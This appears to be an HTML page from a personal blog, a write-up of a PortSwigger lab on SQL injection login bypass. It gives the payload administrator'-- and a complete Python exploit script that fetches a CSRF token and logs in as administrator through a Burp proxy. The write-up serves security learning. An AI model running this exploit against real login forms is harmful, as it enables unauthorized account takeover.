@@ -1,0 +1,222 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+  
+    <!-- Canonical & SEO -->
+    <title>SQL Injection Login Bypass | Shubham Ranpise</title>
+    <meta name="description" content="Learn how SQL injection can be used to bypass login authentication. Real-world example and practical explanation." />
+    <link rel="canonical" href="https://shubhamranpise.com/ctf/portswigger/sqli2.html" />
+  
+    <!-- Open Graph -->
+    <meta property="og:type" content="article" />
+    <meta property="og:title" content="SQL Injection Login Bypass | Shubham Ranpise" />
+    <meta property="og:description" content="Walkthrough of an SQL injection vulnerability that bypasses login mechanisms, with exploit steps and secure coding tips." />
+    <meta property="og:url" content="https://shubhamranpise.com/ctf/portswigger/sqli2.html" />
+    <meta property="og:image" content="https://shubhamranpise.com/assets/og-image.jpg" />
+  
+    <!-- Twitter Card -->
+    <meta name="twitter:card" content="summary_large_image" />
+    <meta name="twitter:title" content="SQLi Login Bypass Writeup | Shubham Ranpise" />
+    <meta name="twitter:description" content="A practical SQL injection login bypass example explained." />
+    <meta name="twitter:image" content="https://shubhamranpise.com/assets/og-image.jpg" />
+  
+    <!-- Favicon -->
+    <link rel="icon" href="https://shubhamranpise.com/assets/favicon.png" type="image/png" />
+  
+    <!-- Preloads -->
+    <link rel="preload" href="./../../../assets/home_light.png" as="image" />
+    <link rel="preload" href="./../../../assets/theme_light.png" as="image" />
+    <link rel="preload" href="./../../../assets/profile-pic.png" as="image" />
+  
+    <!-- Theme & Fonts -->
+    <meta http-equiv="Content-Security-Policy" content="upgrade-insecure-requests" />
+    <link rel="stylesheet" href="./../../../static/css/style.css" />
+    <link rel="stylesheet" href="./../../../static/css/mediaqueries.css" />
+  
+    <!-- Google Analytics -->
+    <script async src="https://www.googletagmanager.com/gtag/js?id=G-45Z0Y6HPDS"></script>
+    <script>
+      window.dataLayer = window.dataLayer || [];
+      function gtag() { dataLayer.push(arguments); }
+      gtag('js', new Date());
+      gtag('config', 'G-45Z0Y6HPDS');
+    </script>
+  
+    <!-- JSON-LD Schema -->
+    <script type="application/ld+json">
+    {
+      "@context": "https://schema.org",
+      "@type": "TechArticle",
+      "name": "SQL Injection Login Bypass",
+      "author": {
+        "@type": "Person",
+        "name": "Shubham Ranpise"
+      },
+      "datePublished": "2025-04-23",
+      "description": "Step-by-step guide to exploiting a login bypass using SQL injection. Part of Shubham Ranpise's PortSwigger CTF series.",
+      "url": "https://shubhamranpise.com/ctf/portswigger/sqli2.html"
+    }
+    </script>
+</head>
+  
+<body>
+    <header>
+        <nav id="desktop-nav">
+            <div class="logo">
+                <a href="./../../../index.html" class="logo-wrapper">
+                    <img src="./../../../assets/home_light.png" src-light="./../../../assets/home_light.png"
+                        src-dark="./../../../assets/home_dark.png" alt="Home Logo" class="icon logo-icon" />
+                    <span>Shubham</span>
+                </a>
+            </div>
+
+            <div>
+                <ul class="nav-links">
+                    <li><a href="./../../../ctf/ctf.html" class="active">CTF</a></li>
+                    <li><a href="./../../../notes/notes.html">Notes</a></li>
+                    <li><a href="./../../../about/about.html">About</a></li>
+                    <li>
+                        <img id="modeToggle" class="icon color-icon" src="./../../../assets/theme_light.png"
+                            src-light="./../../../assets/theme_light.png" src-dark="./../../../assets/theme_dark.png"
+                            alt="Color theme icon" />
+                    </li>
+                </ul>
+            </div>
+        </nav>
+    </header>
+
+    <nav id="hamburger-nav">
+        <div class="logo">
+            <a href="./../../../index.html" class="logo-wrapper">
+                <img src="./../../../assets/home_light.png" src-light="./../../../assets/home_light.png"
+                    src-dark="./../../../assets/home_dark.png" alt="Home Logo" class="icon logo-icon" />
+                <span>Shubham</span>
+            </a>
+        </div>
+        <div class="hamburger-menu">
+            <div class="hamburger-icon" onclick="toggleMenu()">
+                <span></span>
+                <span></span>
+                <span></span>
+            </div>
+            <div class="menu-links">
+                <li><a href="./../../../ctf/ctf.html" class="active">CTF</a></li>
+                <li><a href="./../../../notes/notes.html">Notes</a></li>
+                <li><a href="./../../../about/about.html">About</a></li>
+                <li>
+                    <img id="modeToggle2" class="icon color-icon" src="./../../../assets/theme_light.png"
+                        src-light="./../../../assets/theme_light.png" src-dark="./../../../assets/theme_dark.png"
+                        alt="Color theme icon" />
+                </li>
+            </div>
+        </div>
+    </nav>
+
+    <div class="breadcrumb-wrapper">
+        <p class="breadcrumb-text">/
+            <a href="./../../../index.html">Home</a>/
+            <a href="./../../ctf.html">Ctf</a>/
+            <a href="./../portswigger.html">Portswigger</a>/
+            <span>SQLi 2</span>
+        </p>
+    </div>
+    <br>
+
+    <section id="ctf">
+        <h2 class="lab-heading">SQL injection vulnerability allowing login bypass</h2>
+        <div class="lab-section">
+            <h3 class="lab-date">🕗 23-April-2025</h3>
+            <h3 class="lab-subheading">📚 What I Learned</h3>
+            <p>This lab showed how a basic SQL injection vulnerability in a login form can be used to bypass
+                authentication. By injecting a crafted input into the username field, I was able to manipulate the
+                backend SQL query and log in as the administrator user — without knowing the password. It was a powerful
+                reminder of how dangerous it is to construct SQL queries directly from user input.</p>
+
+            <h3 class="lab-subheading">⚙️ How Exploit Works</h3>
+            <p>
+                [+] Start Burp Suite before running the script — it uses a proxy for visibility.<br>
+                [+] The login form input is vulnerable to SQL injection.<br>
+                [+] A crafted username like <b><i>administrator'--</i></b> bypasses password validation.<br>
+                [+] The server logs you in as <b><i>administrator</i></b> without needing the correct password.<br>
+                [+] CSRF token is fetched dynamically to submit a valid request.<br>
+                [+] Login success is confirmed when the error message is not shown.
+            </p>
+
+            <h3 class="lab-subheading">🖥️ Command to Run</h3>
+            <div class="code-block-wrapper">
+                <pre><code>python3 exploit.py https://&lt;your-lab-id&gt;.web-security-academy.net
+</code></pre>
+                <div class="floating-code-buttons">
+                    <button class="copy-btn">📋</button>
+                    <button class="download-btn">⬇️</button>
+                </div>
+
+            </div>
+
+            <br>
+            <div class="code-block-wrapper">
+                <pre><code>import requests
+import sys
+import urllib3
+from bs4 import BeautifulSoup
+
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+
+proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}
+
+def get_csrf_token(s, url):
+    uri = "/login"
+    r = s.get(url + uri , verify=False, proxies=proxies)
+    soup = BeautifulSoup(r.text, 'html.parser')
+    csrf = soup.find("input") ['value']
+    return csrf
+
+def exploit_sqli(s, url, payload):
+    csrf = get_csrf_token(s, url)
+    data = {"csrf": csrf,
+            "username": payload,
+            "password": payload}
+    uri = "/login"
+    r = s.post(url + uri, data=data, verify=False, proxies=proxies)
+    res = r.text
+    
+    if "Invalid username or password." in res:
+        return False
+    else:
+        return True
+    
+if __name__ == "__main__":
+    try:
+        url = sys.argv[1].strip()
+        sqli_payload = "administrator'--"
+    except IndexError:
+        print("[-] Usage: %s &lt;url&gt;" %sys.argv[0])
+        print('[-] Example: %s www.example.com' %sys.argv[0])
+        
+    s = requests.Session()
+    
+    if exploit_sqli(s, url, sqli_payload):
+        print("[+] SQL injection successful! We have logged in as the administrator user.")
+    else:
+        print("[-] SQL injection unsuccessful.")
+                </code></pre>
+                <div class="floating-code-buttons">
+                    <button class="copy-btn">📋</button>
+                    <button class="download-btn">⬇️</button>
+                </div>
+
+            </div>
+    </section>
+
+    <footer>
+        <p>Copyright &#169; 2025 Shubham Ranpise.</p>
+    </footer>
+
+    <script src="./../../../static/js/main.js"></script>
+</body>
+
+</html>
